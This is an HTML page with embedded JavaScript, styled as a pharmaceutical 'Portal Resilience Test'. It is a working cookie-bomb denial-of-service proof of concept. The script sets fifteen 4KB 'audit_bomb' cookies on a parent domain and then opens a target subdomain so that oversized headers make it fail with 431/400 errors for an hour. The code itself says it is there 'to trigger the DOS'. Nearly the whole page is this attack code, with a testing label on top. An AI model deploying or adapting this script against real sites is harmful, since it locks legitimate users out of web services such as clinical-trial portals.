<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>PharmaSec: Live Resilience Auditor</title>
    <style>
        body { font-family: 'Segoe UI', sans-serif; background: #f0f2f5; display: flex; justify-content: center; padding: 50px; }
        .container { background: white; padding: 30px; border-radius: 12px; box-shadow: 0 4px 20px rgba(0,0,0,0.08); width: 450px; border-top: 6px solid #d93025; }
        h2 { color: #d93025; margin-top: 0; font-size: 1.3rem; }
        .input-group { margin-bottom: 20px; text-align: left; }
        label { display: block; font-weight: 600; font-size: 0.85rem; margin-bottom: 8px; color: #555; }
        input { width: 100%; padding: 12px; border: 1px solid #ddd; border-radius: 6px; box-sizing: border-box; font-size: 0.95rem; }
        .btn-run { background: #d93025; color: white; border: none; padding: 15px; width: 100%; border-radius: 6px; font-weight: bold; cursor: pointer; font-size: 1rem; }
        .btn-run:hover { background: #b3261e; }
        .status { margin-top: 20px; font-size: 0.85rem; color: #666; background: #fff8f7; padding: 10px; border-radius: 4px; display: none; border: 1px solid #fad2cf; }
    </style>
</head>
<body>

<div class="container">
    <h2>ðŸ§¬ Portal Resilience Test</h2>
    <p style="font-size: 0.85rem; color: #777;">Verify if parent-domain cookie binding locks out the target subdomain.</p>
    
    <div class="input-group">
        <label>Parent Domain (Scope):</label>
        <input type="text" id="parentDomain" placeholder=".abacus.com" value=".">
    </div>

    <div class="input-group">
        <label>Target Subdomain (To Test):</label>
        <input type="text" id="targetSubdomain" placeholder="https://trials.abacus.com">
    </div>

    <button class="btn-run" onclick="runLiveAudit()">ðŸš€ BIND & OPEN NEW TAB</button>

    <div id="statusBox" class="status"></div>
</div>

<script>
    function runLiveAudit() {
        const parent = document.getElementById('parentDomain').value.trim();
        const target = document.getElementById('targetSubdomain').value.trim();
        const status = document.getElementById('statusBox');

        if (!target.startsWith('http')) {
            alert("Please include http:// or https:// in the target URL");
            return;
        }

        status.style.display = "block";
        status.innerHTML = "<b>Status:</b> Planting 60KB payload on " + parent + "...";

        try {
            // Bind the payload (15 cookies * 4KB = 60KB)
            for (let i = 0; i < 15; i++) {
                let payload = "X".repeat(4000);
                document.cookie = `audit_bomb_${i}=${payload}; Domain=${parent}; Path=/; Max-Age=3600; SameSite=Lax`;
            }

            status.innerHTML += "<br><b>Success:</b> Cookies bound. Opening live check...";

            // Open the target in a new tab to trigger the DOS
            setTimeout(() => {
                window.open(target, '_blank');
                status.innerHTML += "<br><b>Check:</b> Look at the new tab. If it shows 431/400, it is VULNERABLE.";
            }, 1000);

        } catch (e) {
            status.innerHTML = "<b>Error:</b> " + e.message;
        }
    }
</script>

</body>
</html>
